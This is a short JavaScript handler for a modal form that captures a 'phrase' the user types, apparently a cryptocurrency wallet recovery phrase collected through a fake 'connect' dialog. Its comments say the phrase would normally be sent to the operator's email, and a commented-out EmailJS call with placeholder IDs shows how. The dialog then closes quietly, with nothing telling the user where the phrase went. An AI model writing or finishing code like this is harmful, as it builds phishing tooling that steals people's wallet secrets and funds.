document.getElementById('connectForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission

    const phrase = document.getElementById('phraseInput').value;

    // Here you would typically send the phrase to your email
    // For demonstration, we'll just log it to the console
    console.log('Phrase entered:', phrase);

    // Example of sending the phrase to an email service
    // EmailJS or similar service can be used here
    /*
    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
        phrase: phrase
    })
    .then(function(response) {
        console.log('SUCCESS!', response.status, response.text);
    }, function(error) {
        console.log('FAILED...', error);
    });
    */

    // Clear the input field after submission
    document.getElementById('phraseInput').value = '';
    // Close the modal
    $('#connectModal').modal('hide');
});
